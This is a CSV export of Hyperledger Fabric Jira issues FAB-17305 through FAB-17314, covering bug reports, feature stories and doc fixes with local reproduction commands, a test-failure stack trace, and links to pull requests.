"Add block level validations in ""kafka to raft migration"" shell script",FAB-17305,43824,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,bharadwajambati1,rameshthoomu,rameshthoomu,06/Jan/20 12:55 PM,30/Jan/20 12:14 AM,28/Oct/23 3:09 AM,30/Jan/20 12:14 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Add ""Block level validations"" and ""Consensus type"" validation in the below script while in the process of fetching blocks and updating consensus type in the migration process. [https://github.com/hyperledger/fabric-test/blob/master/tools/operator/scripts/migrateToRaft.sh]",,bharadwajambati1,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8s",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),bharadwajambati1,rameshthoomu,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Jan/20 11:21 PM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/41/commits/5068af81abcfa4eedc0dadf71b5dbfd9c2584329];;;","22/Jan/20 3:17 AM;bharadwajambati1;[https://github.com/hyperledger/fabric-test/pull/41];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Wrong artifact names for fabric-ca in test-network,FAB-17306,43826,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,tatsu-sato,tatsu-sato,tatsu-sato,07/Jan/20 3:26 AM,17/Jan/20 6:36 AM,28/Oct/23 3:09 AM,17/Jan/20 6:36 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-samples,,,,,,,,,0,,,,,,"In `fabric-samples/test-network/network.sh`, some artifact names for fabric-ca are wrong.

Artifacts names which include `issuerPublicKey` and `issuerRevocationPublicKey` should start with capital letters.

 

Due to the wrong names, some files remain even after running the command to bring down networks using fabric-ca.",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016yj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ApproveForMyOrg should check the InitRequired parameter for the current number,FAB-17307,43827,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,07/Jan/20 1:21 PM,09/Jan/20 3:36 AM,28/Oct/23 3:09 AM,09/Jan/20 3:36 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"ApproveForMyOrg puts a chaincode definition entry for either the currently defined
 sequence number or the next sequence number.
 According to comments on the current implementation, 
 for the definition of the current sequence number (which means it has been committed), 
 this command should reject the requested definition unless the requested one must match
 exactly the current one.

However, the current ApproveForMyOrg command does not check the InitRequired parameter,
 so the operators can update the InitRequired parameter.
 When an organization does this update, it returns the chaincode to unapproved status
 for the organization.

Commands by using test-network to reproduce the bug:
{code:java}
$ cd fabric-samples/test-network
$ ./network.sh up
(Ommited)

$ ./network.sh createChannel
(Ommited)

$ ./network.sh deployCC
(Ommited)
++ peer lifecycle chaincode approveformyorg -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls true --cafile /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem --channelID mychannel --name fabcar --version 1 --init-required --package-id fabcar_1:a6b61184ef66929c1b6e6ad657c248e9ba6283080eb59250a93e1706eeffe981 --sequence 1
(Ommited)

# Environment variables for Org1
$ export CORE_PEER_TLS_ENABLED=true
$ export CORE_PEER_LOCALMSPID=""Org1MSP""
$ export CORE_PEER_TLS_ROOTCERT_FILE=${PWD}/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
$ export CORE_PEER_MSPCONFIGPATH=${PWD}/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp
$ export CORE_PEER_ADDRESS=localhost:7051
$ export FABRIC_CFG_PATH=$PWD/../config/

# Rerun approveformyorg without --init-required 
$ peer lifecycle chaincode approveformyorg -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls true --cafile /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem --channelID mychannel --name fabcar --version 1 --package-id fabcar_1:a6b61184ef66929c1b6e6ad657c248e9ba6283080eb59250a93e1706eeffe981 --sequence 1
2020-01-07 02:34:20.864 UTC [chaincodeCmd] ClientWait -> INFO 001 txid [f7041b066d1af612582bf0b7e18962457accdac53b4a41c3728f0fef78a7409a] committed with status (VALID) at

# Check the chaincode status
$ peer lifecycle chaincode querycommitted --channelID mychannel --name fabcar
Committed chaincode definition for chaincode 'fabcar' on channel 'mychannel':Version: 1, Sequence: 1, Endorsement Plugin: escc, Validation Plugin: vscc, Approvals: [Org1MSP: false, Org2MSP: true]

# Environment variables for Org2
$ export CORE_PEER_TLS_ENABLED=true
$ export CORE_PEER_LOCALMSPID=""Org2MSP""
$ export CORE_PEER_TLS_ROOTCERT_FILE=${PWD}/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt
$ export CORE_PEER_MSPCONFIGPATH=${PWD}/organizations/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp
$ export CORE_PEER_ADDRESS=localhost:9051

# Rerun approveformyorg without --init-required 
$ peer lifecycle chaincode approveformyorg -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls true --cafile /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem --channelID mychannel --name fabcar --version 1 --package-id fabcar_1:a6b61184ef66929c1b6e6ad657c248e9ba6283080eb59250a93e1706eeffe981 --sequence 1
2020-01-07 02:55:01.238 UTC [chaincodeCmd] ClientWait -> INFO 001 txid [c3eb41ff7ae02272a05e30c72df47a634be8805941c9bf12c2c68fa74910cc75] committed with status (VALID) at

# Check the chaincode status
$ peer lifecycle chaincode querycommitted --channelID mychannel --name fabcar
Committed chaincode definition for chaincode 'fabcar' on channel 'mychannel':Version: 1, Sequence: 1, Endorsement Plugin: escc, Validation Plugin: vscc, Approvals: [Org1MSP: false, Org2MSP: false]

# Rerun commit without –init-required (Cannot re-commit for the current number)
$ peer lifecycle chaincode commit -o localhost:7050 --ordererTLSHostnameOverride orderer.example.com --tls true --cafile /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem --channelID mychannel --name fabcar --peerAddresses localhost:7051 --tlsRootCertFiles /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles /home/ubuntu/workspace/src/github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt --version 1 --sequence 1
Error: proposal failed with status: 500 - failed to invoke backing implementation of 'CommitChaincodeDefinition': requested sequence is 1, but new definition must be sequence 2
{code}
To fix the bug, it is necessary to add a check mechanism for the InitRequired parameter
 to ApproveForMyOrg.",,sykesm,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,"fabric: a4bf700a277b4de84b1a59da4f9c51b63a3231bb, fabric-samples: a026a4ffbfcf69f33a2a25cd71c5a776ca2fdda5",Unset,No,,,"1|i00n2e:8zlw",,,,Unset,Unset,,Described in the Description,,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,tatsu-sato,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Jan/20 11:20 PM;sykesm;[~tatsu-sato] you have assigned this to yourself. Are you planning on fixing this and creating a PR?

If so, please ""accept"" it transition the bug into the in-progress state.  If not, please unassign yourself so we can move it to the backlog.;;;","09/Jan/20 12:45 AM;sykesm;https://github.com/hyperledger/fabric/pull/462;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Discovery should support private data blind writes,FAB-17308,43831,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,08/Jan/20 12:28 AM,15/Jul/20 2:02 AM,28/Oct/23 3:09 AM,16/Apr/20 3:54 AM,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-peer,,,,,,,,,0,,,,,,"Currently, when a client queries discovery with an endorsement query which has collections in the query, discovery intersects the available peers with the collection definition by removing peers which are not part of the collection since they do not have the pre-images required to read from the namespace.

However, the introduction of *GetPrivateDataHash* makes new use cases possible, namely scenarios where some of the endorsers of a transaction aren't in the collection, but they are fed with the pre-image via other means (e.g the transient field) and after validating the pre-image using *GetPrivateDataHash*, they can perform the same computation as peers that are in the collection. In such a case, discovery will filter out those peers needlessly.

Furthermore, we want to be able to support writes to collections that have their own endorsement policy, while at the same time the membership of the collections might not even intersect (e.g if we have an org specific collection and we want to delete a key from collection ""orgA"" and write it into collection ""orgB"").

The above use cases require the ability to convey to discovery not to filter out peers based on collection association.

Additionally and independently, we sometimes want to do a chaincode-to-chaincode transaction where some of the chaincodes are used for read only, and then we don't want to take into account the endorsement policy, however it can be useful if discovery would still be aware of this so it can filter out peers that do not have the chaincode installed.

To support all the above, I propose to add 2 new flags (3 and 4 below) in the [ChaincodeCall|https://github.com/hyperledger/fabric-protos/blob/master/discovery/protocol.proto#L156] protobuf message:
{code:java}
message ChaincodeCall {
    string name = 1;
    repeated string collection_names = 2;
    bool no_private_reads = 3; // Indicates we do not need to read from private data
    bool no_public_writes = 4; // Indicates we do not need to write to the chaincode namespace
}
{code}
Adding these 2 booleans will preserve backward compatibility to Fabric versions 1.4 and below, but will enhance the expression power to support more use cases.

 

[~denyeart]",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17299,,,,,,,,,,,,,,,,FGJ-97,FABG-986,,FABN-1596,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i016zn:",,,,Yes,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),yacovm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,dependabot/bundler/docs/nokogiri-1.14.3,0.2.x,dependabot/bundler/docs/activesupport-6.0.6.1,dependabot/go_modules/bindings/go-apiv1/golang.org/x/text-0.3.8,0.1.x,main,dependabot/go_modules/golang.org/x/net-0.7.0,dependabot/go_modules/golang.org/x/text-0.3.8,dependabot/go_modules/bindings/go-apiv1/golang.org/x/net-0.7.0,dependabot/bundler/docs/commonmarker-0.23.9,mergify/bp/release-2.2/pr-3750,dependabot/go_modules/bindings/go-apiv2/golang.org/x/net-0.7.0,release-2.3,release-2.2,dependabot/go_modules/bindings/go-apiv2/golang.org/x/text-0.3.8,release-2.5,release-2.4,github-settings,dependabot/go_modules/bindings/go-apiv2/golang.org/x/sys-0.1.0,dependabot/go_modules/golang.org/x/sys-0.1.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,dependabot/go_modules/bindings/go-apiv1/golang.org/x/sys-0.1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jan/20 10:38 PM;yacovm;https://github.com/hyperledger/fabric/pull/538;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"CFT integration tests fail with ""resource temporarily available"" panic",FAB-17309,43836,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,sykesm,sykesm,08/Jan/20 4:10 AM,09/Jan/20 12:46 AM,28/Oct/23 3:09 AM,09/Jan/20 12:46 AM,v2.0.0,,,,,,,,,v2.0.0,,,,fabric-orderer,,,,,,,,,0,ci-flake,ipm,,,,"This failure:
{code}
• Failure [62.124 seconds]
EndToEnd Crash Fault Tolerance
/Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/integration/raft/cft_test.go:43
  when orderer TLS certificates expire
  /Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/integration/raft/cft_test.go:343
    is still possible to recover [It]
    /Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/integration/raft/cft_test.go:344

    Timed out after 60.001s.
    Expected
        <<-chan struct {} | len:0, cap:0>: 0xc001bea420
    to be closed

    /Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/integration/raft/cft_test.go:434
{code}

happens when the orderer panics:
{code}
[e][OrdererOrg.orderer1] 2020-01-07 13:32:59.912 EST [orderer.common.server] initializeServerConfig -> INFO 00f Starting orderer with TLS enabled
[e][OrdererOrg.orderer1] panic: Error opening leveldb: resource temporarily unavailable
[e][OrdererOrg.orderer1] 
[e][OrdererOrg.orderer1] goroutine 1 [running]:
[e][OrdererOrg.orderer1] github.com/hyperledger/fabric/common/ledger/util/leveldbhelper.(*DB).Open(0xc000178e10)
[e][OrdererOrg.orderer1] 	/Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/common/ledger/util/leveldbhelper/leveldb_helper.go:75 +0x285
[e][OrdererOrg.orderer1] github.com/hyperledger/fabric/common/ledger/util/leveldbhelper.openDBAndCheckFormat(0xc000361580, 0x0, 0x0, 0x0)
[e][OrdererOrg.orderer1] 	/Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/common/ledger/util/leveldbhelper/leveldb_provider.go:63 +0x11b
[e][OrdererOrg.orderer1] github.com/hyperledger/fabric/common/ledger/util/leveldbhelper.NewProvider(0xc000361580, 0xc000361580, 0x4, 0xc00014c700)
[e][OrdererOrg.orderer1] 	/Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/common/ledger/util/leveldbhelper/leveldb_provider.go:51 +0x2f
[e][OrdererOrg.orderer1] github.com/hyperledger/fabric/common/ledger/blkstorage/fsblkstorage.NewProvider(0xc000361540, 0xc000361560, 0x4df0e80, 0x55ed2e0, 0xc00014c690, 0x6d, 0x0, 0x0)
[e][OrdererOrg.orderer1] 	/Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/common/ledger/blkstorage/fsblkstorage/fs_blockstore_provider.go:43 +0x158
[e][OrdererOrg.orderer1] github.com/hyperledger/fabric/common/ledger/blockledger/fileledger.New(0xc00014ca80, 0x61, 0x4df0e80, 0x55ed2e0, 0x8c00008, 0x0, 0xc000429630, 0x400f158)
[e][OrdererOrg.orderer1] 	/Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/common/ledger/blockledger/fileledger/factory.go:71 +0x107
[e][OrdererOrg.orderer1] github.com/hyperledger/fabric/orderer/common/server.createLedgerFactory(0xc0002f7200, 0x4df0e80, 0x55ed2e0, 0xc000014700, 0x45b, 0x65b, 0xc000018300, 0xf1, 0x2f1)
[e][OrdererOrg.orderer1] 	/Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/orderer/common/server/util.go:29 +0xf8
[e][OrdererOrg.orderer1] github.com/hyperledger/fabric/orderer/common/server.Main()
[e][OrdererOrg.orderer1] 	/Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/orderer/common/server/main.go:113 +0x664
[e][OrdererOrg.orderer1] main.main()
[e][OrdererOrg.orderer1] 	/Users/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/cmd/orderer/main.go:15 +0x20
[d][OrdererOrg.orderer2] spawned /var/folders/tw/dsbwtnf50w7dhvhh0tkg7fwr0000gn/T/gexec_artifacts750850912/g028006345/orderer (pid: 15850)
{code}

and that seems to be caused by a restart of the orderer before the previous process completely terminated.
{code}
[e][OrdererOrg.orderer2] 2020-01-07 13:32:59.815 EST [core.comm] ServerHandshake -> ERRO 02d TLS handshake failed with error remote error: tls: bad certificate server=Orderer remoteaddress=127.0.0.1:61409
[e][OrdererOrg.orderer3] 2020-01-07 13:32:59.815 EST [core.comm] ServerHandshake -> ERRO 02b TLS handshake failed with error remote error: tls: bad certificate server=Orderer remoteaddress=127.0.0.1:61410
STEP: Killing orderers
STEP: Launching orderers again
[e][OrdererOrg.orderer1] 2020-01-07 13:32:59.825 EST [orderer.common.server] handleSignals -> INFO 02d Received signal: 15 (terminated)
[e][OrdererOrg.orderer2] 2020-01-07 13:32:59.825 EST [orderer.common.server] handleSignals -> INFO 02e Received signal: 15 (terminated)
{code}

After we terminate the orderers, we should wait for the termination to complete.",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0170r:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Jan/20 4:26 AM;sykesm;https://github.com/hyperledger/fabric/pull/460;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable service discovery to query the _lifecycle endorsers on a channel,FAB-17310,43837,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,08/Jan/20 4:37 AM,29/Jan/20 3:23 AM,28/Oct/23 3:09 AM,29/Jan/20 3:23 AM,,,,,,,,,,v2.0.0,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"Similar to using service discovery to determine the endorsers needed to meet a user-defined chaincode's endorsement policy, we should also be able to use it to discover the endorsers required to commit a chaincode definition using _lifecycle.

Acceptance:
- Query _lifecycle on a specific channel and receive the valid list of endorsers required to meet the endorsement policy. (Version does not come into play.)

The list of endorsement should match the active configuration. This will likely involve creating a test with a non-standard _lifecycle endorsement policy.",,denyeart,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zlsk",,,,Unset,Unset,,(Please add steps to reproduce),3.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wlahti,yacovm,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Jan/20 7:11 AM;yacovm;i guess all that is needed is to ensure that *lifecycle.MetadataProvider* answers invocations that have *_lifecycle* in them ?;;;","08/Jan/20 6:52 PM;yacovm;Though I guess you also need to register the *_lifecycle* chaincode into discovery as if it was a regular chaincode;;;","28/Jan/20 11:36 PM;wlahti;Merged into master. PR for release-2.0: [https://github.com/hyperledger/fabric/pull/575] also merged.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add range query unit tests for keys with special and non-English characters,FAB-17311,43838,41914,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,wenjian,wenjian,08/Jan/20 5:00 AM,08/Jan/20 10:44 PM,28/Oct/23 3:09 AM,08/Jan/20 10:44 PM,,,,,,,,,,v2.0.0,,,,fabric-ledger,,,,,,,,,0,,,,,,Add range query unit tests for keys using special characters and non-English characters. The purpose is to verify that couchdb and leveldb will return the same range query result for this kind of keys.,,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01717:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jan/20 5:02 AM;wenjian;PR: https://github.com/hyperledger/fabric/pull/461;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Private data code cleanups,FAB-17312,43840,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,manish-sethi,manish-sethi,08/Jan/20 7:41 AM,09/Nov/20 11:24 PM,28/Oct/23 3:09 AM,,,,,,,,,,,Future,,,,fabric-ledger,,,,,,,,,0,cleanup,,,,,Code cleanup for private data. For details see subtasks.,,denyeart,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5108,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0ip9r",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,manish-sethi,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Feb/20 3:13 AM;denyeart;The cleanup can be done in the first release that doesn't support direct upgrade from v1.4.x, therefore marking as Future.;;;","19/Feb/20 11:26 AM;Senthil1;Added detailed comments to each task explaining the reason for making these changes post v2.x LTS.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FAB-16293,FAB-17313,43841,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,manish-sethi,manish-sethi,08/Jan/20 8:06 AM,12/Jun/20 12:31 AM,28/Oct/23 3:09 AM,19/Apr/20 1:17 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqfo:s",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Apr/20 1:17 PM;denyeart;This looks like a mistake, closing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"docker-compose cmd in docs/source/build_network.rst has extra ""up""",FAB-17314,43842,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Low,Done,ShifengXu,ShifengXu,ShifengXu,08/Jan/20 4:21 PM,08/Jan/20 11:10 PM,28/Oct/23 3:09 AM,08/Jan/20 11:10 PM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"In the file: docs/source/build_network.rst, there is statement:

We want to go through the commands manually in order to expose the
 syntax and functionality of each call.

First let's start our network:

.. code:: bash

docker-compose -f docker-compose-cli.yaml up -f docker-compose-etcdraft2.yaml up -d

 
 But there is an extra option ""up"" in the above command.",,ShifengXu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01723:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),ShifengXu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jan/20 11:07 PM;ShifengXu;code fix PR merged:
https://github.com/hyperledger/fabric/pull/464;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
